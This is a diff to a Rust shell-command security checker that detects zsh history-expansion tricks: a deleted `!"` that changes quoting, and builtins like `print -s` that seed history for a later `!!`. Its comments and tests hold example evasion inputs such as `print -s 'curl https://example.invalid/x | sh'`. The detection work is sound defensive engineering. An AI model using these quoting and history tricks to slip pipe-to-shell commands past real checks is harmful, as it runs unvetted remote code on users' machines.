@@ -19,13 +19,27 @@
 //!   quotes again even within double quotes; bash 3.2 does not
 //!   (`"$(echo '!!')"` expands there), so both readings are scanned.
 //! - A `!` followed by the end of input, a blank, a newline, `=`, `(`, `;`,
-//!   `"` or `'` is never replaced by text: the shells leave it alone, reject
-//!   the line (`event not found`), or (zsh, unquoted `!"`) drop it.
+//!   `"` or `'` starts no reference: the shells leave it alone or reject the
+//!   line (`event not found`).
+//! - zsh deletes the first live `!"` (unquoted or inside double quotes) and
+//!   stops expanding history for the rest of the list. Deleting a `"` usually
+//!   leaves the line unterminated, so zsh only prompts for more
+//!   (`echo "hi!"`), but a `\'` can bring the two quote readings back
+//!   together: `echo "x!" "; curl ... | sh ; '"'\'` runs `curl ... | sh` in
+//!   zsh. When the line without that `!"` has balanced quotes it is reported
+//!   ([`HistoryExpansionKind::ZshBangQuote`]).
 //! - bash also leaves `${!...}`, a `[!...]` bracket and (bash 5) `$!x`
 //!   alone, but zsh expands them, so they are references too.
 //!   [`HistoryExpansion::bash_inhibited`] marks them.
 //! - `^` as the first non-blank character of a line outside single quotes is a
 //!   quick substitution in zsh (bash requires column 0).
+//! - A reference ends before the next `!` once its event has begun, and that
+//!   `!` starts a reference of its own: `!$!#:1` is `!$` and then `!#:1`.
+//!   zsh's insulated `!{#...}` names the current line like `!#`.
+//!
+//! [`history_seeding_segments`] covers the other half of a re-run: builtins
+//! that put text into history without running it (`print -s`, `history -s`,
+//! `fc -R`), which a later plain `!!` would then execute unchecked.
 //!
 //! Not modelled: a changed `histchars`, and history expansion turned off
 //! (`set +H`, `setopt NO_BANG_HIST`); with it off the references found here
@@ -45,6 +59,10 @@ pub(crate) enum HistoryExpansionKind {
     QuickSubstitution,
     /// Any other `!` reference: words of an earlier history entry.
     Event,
+    /// A live `!"` that zsh deletes, after which the rest of the line still
+    /// has balanced quotes: zsh runs a line quoted differently from the
+    /// checked text.
+    ZshBangQuote,
 }
 
 /// One history reference in a shell input.
@@ -109,10 +127,29 @@ pub(crate) fn history_expansions(raw: &str) -> Vec<HistoryExpansion> {
     };
     let mut bangs = std::collections::BTreeSet::new();
     let mut carets = std::collections::BTreeSet::new();
+    let mut bang_quotes = std::collections::BTreeSet::new();
     for model in [QuoteModel::Nested, QuoteModel::Flat] {
-        scan(raw, model, &heredoc_bodies, &mut bangs, &mut carets);
+        scan(
+            raw,
+            model,
+            &heredoc_bodies,
+            &mut bangs,
+            &mut carets,
+            &mut bang_quotes,
+        );
     }
     let mut out: Vec<HistoryExpansion> = Vec::new();
+    if let Some(&start) = bang_quotes.first() {
+        if zsh_bang_quote_view_is_balanced(raw, start) {
+            let line_start = raw[..start].rfind('\n').map_or(0, |newline| newline + 1);
+            out.push(HistoryExpansion {
+                kind: HistoryExpansionKind::ZshBangQuote,
+                range: start..start + 2,
+                after_first_line: !raw[..line_start].trim().is_empty(),
+                bash_inhibited: false,
+            });
+        }
+    }
     for start in carets {
         out.push(reference_at(
             raw,
@@ -121,7 +158,8 @@ pub(crate) fn history_expansions(raw: &str) -> Vec<HistoryExpansion> {
         ));
     }
     for start in bangs {
-        let kind = if raw.as_bytes().get(start + 1) == Some(&b'#') {
+        let end = reference_end(raw.as_bytes(), start);
+        let kind = if is_current_line_reference(&raw[start..end]) {
             HistoryExpansionKind::CurrentLine
         } else {
             HistoryExpansionKind::Event
@@ -160,15 +198,45 @@ enum Closer {
     Backtick,
 }
 
+/// Whether `raw` with the zsh-deleted `!"` at `start` removed (see the
+/// module docs) ends with every quote and substitution closed, so zsh runs
+/// it rather than prompting for more input.
+fn zsh_bang_quote_view_is_balanced(raw: &str, start: usize) -> bool {
+    let mut view = String::with_capacity(raw.len());
+    view.push_str(&raw[..start]);
+    view.push_str(&raw[start + 2..]);
+    let heredoc_bodies: Vec<Range<usize>> = if view.contains("<<") && view.contains('\n') {
+        crate::extract::posix_heredoc_spans(&view)
+            .unwrap_or_default()
+            .into_iter()
+            .map(|span| span.through_terminator)
+            .collect()
+    } else {
+        Vec::new()
+    };
+    let mut ignored = std::collections::BTreeSet::new();
+    scan(
+        &view,
+        QuoteModel::Nested,
+        &heredoc_bodies,
+        &mut ignored.clone(),
+        &mut ignored.clone(),
+        &mut ignored,
+    )
+}
+
 /// Record the start of every `!` reference and line-start `^` that `model`
-/// reads as live.
+/// reads as live, and (zsh's [`QuoteModel::Nested`] reading only) of every
+/// live `!"`. Returns whether the text ends with every quote and
+/// substitution closed.
 fn scan(
     raw: &str,
     model: QuoteModel,
     heredoc_bodies: &[Range<usize>],
     bangs: &mut std::collections::BTreeSet<usize>,
     carets: &mut std::collections::BTreeSet<usize>,
-) {
+    bang_quotes: &mut std::collections::BTreeSet<usize>,
+) -> bool {
     let bytes = raw.as_bytes();
     let mut stack = vec![Frame::Unquoted(Closer::Top)];
     let mut index = 0usize;
@@ -222,6 +290,9 @@ fn scan(
                         index = end;
                         continue;
                     }
+                    if model == QuoteModel::Nested && bytes.get(index + 1) == Some(&b'"') {
+                        bang_quotes.insert(index);
+                    }
                 }
                 b'$' if model == QuoteModel::Nested && bytes.get(index + 1) == Some(&b'(') => {
                     stack.push(Frame::Unquoted(Closer::Paren(0)));
@@ -251,6 +322,9 @@ fn scan(
                         bangs.insert(index);
                         index = end;
                         continue;
+                    }
+                    if model == QuoteModel::Nested && bytes.get(index + 1) == Some(&b'"') {
+                        bang_quotes.insert(index);
                     }
                 }
                 b'$' if model == QuoteModel::Nested && bytes.get(index + 1) == Some(&b'(') => {
@@ -285,6 +359,7 @@ fn scan(
         }
         index += 1;
     }
+    stack == [Frame::Unquoted(Closer::Top)]
 }
 
 /// Whether the byte at `index` follows an odd run of backslashes.
@@ -330,7 +405,23 @@ fn ends_reference(byte: u8) -> bool {
         )
 }
 
-/// End of the reference text that starts at `start` (a `!` or `^`).
+/// Whether the reference text `text` (from its `!`) names the line being
+/// typed: `!#...`, or zsh's insulated `!{#...}`. A `!#` or `{#` later inside
+/// it (a `!{...}` or `!?...?` that holds one) counts too, which can only
+/// report more. In `!!#` the second `!` is the event, so the `#` is text.
+fn is_current_line_reference(text: &str) -> bool {
+    let rest = &text[1..];
+    rest.starts_with('#')
+        || rest.starts_with("{#")
+        || rest
+            .get(1..)
+            .is_some_and(|tail| tail.contains("!#") || tail.contains("{#"))
+}
+
+/// End of the reference text that starts at `start` (a `!` or `^`). A `!`
+/// reference ends before a later `!` once its event has begun (`!!` is one
+/// event): both shells expand `!$!#:1` as `!$` and then `!#:1`, so the next
+/// `!` starts a reference of its own.
 fn reference_end(bytes: &[u8], start: usize) -> usize {
     let mut index = start + 1;
     match bytes.get(index) {
@@ -360,7 +451,11 @@ fn reference_end(bytes: &[u8], start: usize) -> usize {
         }
         _ => {}
     }
-    while bytes.get(index).is_some_and(|byte| !ends_reference(*byte)) {
+    let bang = bytes[start] == b'!';
+    while bytes
+        .get(index)
+        .is_some_and(|byte| !ends_reference(*byte) && !(bang && *byte == b'!' && index > start + 1))
+    {
         index += 1;
     }
     index.max(start + 1)
@@ -444,7 +539,8 @@ pub(crate) struct CommandProbe {
 /// dynamic text. A plain re-run (see [`is_plain_event_reference`]) is exempt
 /// when it is the whole top-level simple command, optionally after `sudo` or
 /// `doas` alone and before output redirections, and not a pipe sink: it
-/// re-runs a command that was checked when it ran.
+/// re-runs a command that was checked when it ran. So is a plain re-run with
+/// the print-only `:p` modifier (`!!:p`), which runs nothing.
 pub(crate) fn command_probe(raw: &str, expansions: &[HistoryExpansion]) -> Option<CommandProbe> {
     let exempt = exempt_plain_reruns(raw, expansions);
     let mut ranges: Vec<Range<usize>> = expansions
@@ -501,7 +597,10 @@ fn exempt_plain_reruns(
             [rerun, tail @ ..] => (*rerun, tail),
             [] => continue,
         };
-        if !is_plain_event_reference(word)
+        // `:p` only prints the re-run (and records it in history again);
+        // after any other modifier the printed text was never checked.
+        let rerun = word.strip_suffix(":p").unwrap_or(word);
+        if !is_plain_event_reference(rerun)
             || !only_output_redirections(tail.iter().map(|(_, word)| *word))
         {
             continue;
@@ -578,14 +677,17 @@ fn only_output_redirections<'a>(words: impl IntoIterator<Item = &'a str>) -> boo
 
 /// References that rewrite the line with text Tirith cannot see whatever
 /// position they are in: `!#` (the line being typed), a line-start quick
-/// substitution, and an event reference on a later line of a multi-line
-/// input (which can name a line pasted before it). A reference bash leaves
-/// alone counts here only as `!#`, which zsh does expand.
+/// substitution, an event reference on a later line of a multi-line input
+/// (which can name a line pasted before it), and a zsh-deleted `!"` that
+/// leaves a differently quoted, complete line. A reference bash leaves alone
+/// counts here only as `!#`, which zsh does expand.
 pub(crate) fn rewriting_references(expansions: &[HistoryExpansion]) -> Vec<&HistoryExpansion> {
     expansions
         .iter()
         .filter(|reference| match reference.kind {
-            HistoryExpansionKind::CurrentLine | HistoryExpansionKind::QuickSubstitution => true,
+            HistoryExpansionKind::CurrentLine
+            | HistoryExpansionKind::QuickSubstitution
+            | HistoryExpansionKind::ZshBangQuote => true,
             HistoryExpansionKind::Event => reference.after_first_line && !reference.bash_inhibited,
         })
         .collect()
@@ -639,6 +741,14 @@ pub(crate) fn rewrite_finding(
             "a `!` reference on a later line of a multi-line input can copy words of a line pasted before it",
         );
     }
+    if references
+        .iter()
+        .any(|reference| reference.kind == HistoryExpansionKind::ZshBangQuote)
+    {
+        forms.push(
+            "zsh deletes `!\"`, so the quoting of the line zsh runs differs from the checked text",
+        );
+    }
     crate::verdict::Finding {
         rule_id: crate::verdict::RuleId::AnalysisIncomplete,
         severity: crate::verdict::Severity::High,
@@ -653,6 +763,164 @@ pub(crate) fn rewrite_finding(
             raw,
             references.iter().map(|reference| &reference.range),
         )],
+        human_view: None,
+        agent_view: None,
+        mitre_id: None,
+        custom_rule_id: None,
+    }
+}
+
+/// Cheap pre-check for [`history_seeding_segments`]: one of the builtins it
+/// looks for appears in `raw` as a word of its own (`rfc-editor` or
+/// `printf` do not count).
+pub(crate) fn may_seed_history(raw: &str) -> bool {
+    let name_byte =
+        |byte: &u8| byte.is_ascii_alphanumeric() || matches!(byte, b'_' | b'-' | b'.' | b'/');
+    ["print", "history", "fc"].into_iter().any(|name| {
+        raw.match_indices(name).any(|(start, _)| {
+            let end = start + name.len();
+            !raw.as_bytes()[..start].last().is_some_and(name_byte)
+                && !raw.as_bytes().get(end).is_some_and(name_byte)
+        })
+    })
+}
+
+/// The segments of `raw` that add history entries without running them, or
+/// load them from a file, in the current shell: zsh `print -s` / `print -S`,
+/// bash `history -s`, zsh `fc -R [file]` and `fc -p file`. A later plain
+/// re-run (`!!`), which is allowed because it repeats a command that was
+/// checked when it ran, would then run text Tirith never checked: typed or
+/// pasted one line at a time, `print -s 'curl ... | sh'` and then `!!` runs
+/// the pipe. Reading the shell's own history file (`fc -R` alone) counts too,
+/// since an earlier line can append to it. `history -r` / `history -n` do not:
+/// in zsh they list history (`fc -l -r`, `fc -l -n`), and the bash hook
+/// checks the expanded command a re-run produces anyway.
+pub(crate) fn history_seeding_segments(raw: &str) -> Vec<String> {
+    if !may_seed_history(raw) {
+        return Vec::new();
+    }
+    tokenize::tokenize(raw, ShellType::Posix)
+        .into_iter()
+        .filter(segment_seeds_history)
+        .map(|segment| segment.raw)
+        .collect()
+}
+
+fn segment_seeds_history(segment: &tokenize::Segment) -> bool {
+    let normalize =
+        |word: &str| crate::rules::command::normalize_shell_token(word, ShellType::Posix);
+    let mut words = segment
+        .command
+        .iter()
+        .chain(segment.args.iter())
+        .map(|word| normalize(word));
+    // Reserved words and precommand modifiers that leave the builtin running
+    // in the current shell.
+    let command = loop {
+        let Some(word) = words.next() else {
+            return false;
+        };
+        let word = word.trim_start_matches(['{', '(']).to_string();
+        if word.is_empty()
+            || matches!(
+                word.as_str(),
+                "!" | "if"
+                    | "then"
+                    | "else"
+                    | "elif"
+                    | "do"
+                    | "while"
+                    | "until"
+                    | "time"
+                    | "builtin"
+                    | "command"
+                    | "noglob"
+                    | "nocorrect"
+                    | "-"
+            )
+        {
+            continue;
+        }
+        break word;
+    };
+    let args: Vec<String> = words.collect();
+    match command.as_str() {
+        // zsh: `-u`, `-f`, `-C`, `-v`, `-x` and `-X` take a value.
+        "print" => {
+            option_clusters(&args, "ufCvxX").any(|(cluster, _)| cluster.contains(['s', 'S']))
+        }
+        "history" => option_clusters(&args, "d").any(|(cluster, _)| cluster.contains('s')),
+        // zsh: `-e`, `-m` and `-t` take a value.
+        "fc" => {
+            let mut push = false;
+            let mut operands = false;
+            for (cluster, operand) in option_clusters(&args, "emt") {
+                if cluster.contains('R') {
+                    return true;
+                }
+                push |= cluster.contains('p');
+                operands |= operand;
+            }
+            push && operands
+        }
+        _ => false,
+    }
+}
+
+/// The option clusters (`-rs` gives `rs`) that lead `args`, up to `--` or the
+/// first operand, paired with whether an operand follows them. A letter of
+/// `valued` takes the rest of its cluster, or the next word, as its value.
+fn option_clusters<'a>(
+    args: &'a [String],
+    valued: &'a str,
+) -> impl Iterator<Item = (&'a str, bool)> + 'a {
+    let mut clusters = Vec::new();
+    let mut index = 0usize;
+    let mut operand = false;
+    while let Some(word) = args.get(index) {
+        index += 1;
+        if word == "--" {
+            operand = index < args.len();
+            break;
+        }
+        let Some(cluster) = word.strip_prefix('-').filter(|cluster| !cluster.is_empty()) else {
+            operand = true;
+            break;
+        };
+        if let Some(position) = cluster.find(|letter| valued.contains(letter)) {
+            if position + 1 == cluster.len() {
+                index += 1;
+            }
+            clusters.push(&cluster[..=position]);
+        } else {
+            clusters.push(cluster);
+        }
+    }
+    clusters.into_iter().map(move |cluster| (cluster, operand))
+}
+
+/// The finding for [`history_seeding_segments`].
+pub(crate) fn seeding_finding(segments: &[String]) -> crate::verdict::Finding {
+    let mut texts: Vec<&str> = Vec::new();
+    for segment in segments {
+        if !texts.contains(&segment.as_str()) {
+            texts.push(segment);
+        }
+    }
+    texts.truncate(8);
+    crate::verdict::Finding {
+        rule_id: crate::verdict::RuleId::AnalysisIncomplete,
+        severity: crate::verdict::Severity::High,
+        title: "Command adds history entries a later re-run executes unchecked".to_string(),
+        description: "`print -s`, `history -s`, `fc -R` and `fc -p FILE` put text into the \
+             interactive shell's history without running it. A later `!!` or `!prefix` re-runs \
+             that text, and Tirith allows a plain re-run only because it repeats a command that \
+             was checked when it ran. Run the command itself instead of adding it to history."
+            .to_string(),
+        evidence: vec![crate::verdict::Evidence::CommandPattern {
+            pattern: EVIDENCE_PATTERN.to_string(),
+            matched: crate::redact::redact_shell_assignments(&texts.join(" ; ")),
+        }],
         human_view: None,
         agent_view: None,
         mitre_id: None,
@@ -729,6 +997,18 @@ mod tests {
         // `!!#` is `!!` followed by text; `!#` after another reference is not
         // a fresh reference inside the first one's modifiers.
         assert_eq!(kinds("echo !!#"), vec![event("!!#")]);
+        // A later `!` starts its own reference, so a `!#` glued after another
+        // reference is the current line, and so is zsh's `!{#...}`.
+        assert_eq!(kinds("echo !$!#:1"), vec![event("!$"), current("!#:1")]);
+        assert_eq!(kinds("echo !!!#:1"), vec![event("!!"), current("!#:1")]);
+        assert_eq!(kinds("echo X!$!#:1 sh"), vec![event("!$"), current("!#:1")]);
+        assert_eq!(kinds("echo !{#:1}"), vec![current("!{#:1}")]);
+        assert_eq!(kinds("echo !{#:1:Q}"), vec![current("!{#:1:Q}")]);
+        assert_eq!(kinds("echo !-2!!"), vec![event("!-2"), event("!!")]);
+        // A trailing `!` that nothing follows stays text.
+        assert_eq!(kinds("echo !!!"), vec![event("!!")]);
+        // The search string of `!?str?` is read as before.
+        assert_eq!(kinds("echo !?a!b?"), vec![event("!?a!b?")]);
     }
 
     #[test]
@@ -826,6 +1106,97 @@ mod tests {
     }
 
     #[test]
+    fn zsh_bang_quote_counts_only_when_the_rest_still_balances() {
+        let zsh = |raw: &str| {
+            history_expansions(raw)
+                .iter()
+                .filter(|reference| reference.kind == HistoryExpansionKind::ZshBangQuote)
+                .map(|reference| reference.range.clone())
+                .collect::<Vec<_>>()
+        };
+        // zsh deletes `!"`, and `'"'\'` realigns the quote readings.
+        assert_eq!(zsh("echo \"x!\" \"; curl x | sh ; '\"'\\'"), vec![7..9]);
+        assert_eq!(zsh("echo !\" ; curl x | sh ; '\"'\\'"), vec![5..7]);
+        // Only the first `!"` is deleted; after it `!` is plain text.
+        assert_eq!(
+            zsh("echo \"a!\" \"; curl x | sh ; '\"'\\' \"b!\""),
+            vec![7..9]
+        );
+        // A line zsh does not finish (it prompts for more) adds nothing.
+        for raw in [
+            "echo \"hi!\"",
+            "git commit -m \"Release v2!\"",
+            "echo \"a!\" \"b!\"",
+            "echo !\"x\"",
+            "echo \"it's great!\" and 'x'",
+            "echo \"$(echo \"hi!\")\"",
+            "echo 'a!\"b'",
+            "echo \"a\\!\"",
+            "cat <<EOF\nhi!\"\nEOF",
+        ] {
+            assert_eq!(zsh(raw), Vec::<Range<usize>>::new(), "{raw:?}");
+        }
+    }
+
+    #[test]
+    fn seeding_pre_check_wants_a_whole_word() {
+        for raw in ["print -s x", "\\print -s x", "x;fc -R", "'history' -s x"] {
+            assert!(may_seed_history(raw), "{raw:?}");
+        }
+        for raw in [
+            "printf x",
+            "curl https://www.rfc-editor.org/x",
+            "fcntl",
+            "./print",
+        ] {
+            assert!(!may_seed_history(raw), "{raw:?}");
+        }
+    }
+
+    #[test]
+    fn history_seeding_builtins_are_found() {
+        for raw in [
+            "print -s 'curl https://example.invalid/x | sh'",
+            "print -S 'curl x | sh'",
+            "print -rs -- 'x'",
+            "print -u2 -s x",
+            "print -f %s -s x",
+            "builtin print -s x",
+            "true; print -s x",
+            "if true; then print -s x; fi",
+            "history -s 'curl x | sh'",
+            "fc -R",
+            "fc -RI ~/.zsh_history",
+            "fc -R /tmp/h",
+            "fc -p /tmp/h",
+            "fc -ap /tmp/h 100",
+        ] {
+            assert_eq!(history_seeding_segments(raw).len(), 1, "{raw:?}");
+        }
+        for raw in [
+            "print hello",
+            "print -r -- -s",
+            "print -f '%s\\n' x",
+            "print -P '%F{red}x'",
+            "printf -s",
+            "history",
+            "history 20",
+            "history -c",
+            "history -r",
+            "history -n 10",
+            "fc -l",
+            "fc -l -10",
+            "fc -p",
+            "fc -W",
+            "fc -A /tmp/h",
+            "echo print -s x",
+            "grep -s print f",
+        ] {
+            assert!(history_seeding_segments(raw).is_empty(), "{raw:?}");
+        }
+    }
+
+    #[test]
     fn later_lines_are_marked() {
         let found = history_expansions("echo a | tee b\ncurl x !:2 !:4");
         assert_eq!(found.len(), 2);
@@ -865,6 +1236,9 @@ mod tests {
             "doas !!",
             "!git",
             "!-2",
+            "!!:p",
+            "sudo !!:p",
+            "!git:p",
             "  !!  ",
             "cd x && !!",
             "!! | less",
@@ -883,6 +1257,10 @@ mod tests {
             "x !!",
             "time !!",
             "sudo sudo !!",
+            // Printing a substituted command records text nothing checked.
+            "!!:s/a/b/:p",
+            "!!:p:s/a/b/",
+            "!!:1:p",
         ] {
             assert!(probe(raw).is_some(), "{raw:?}");
         }
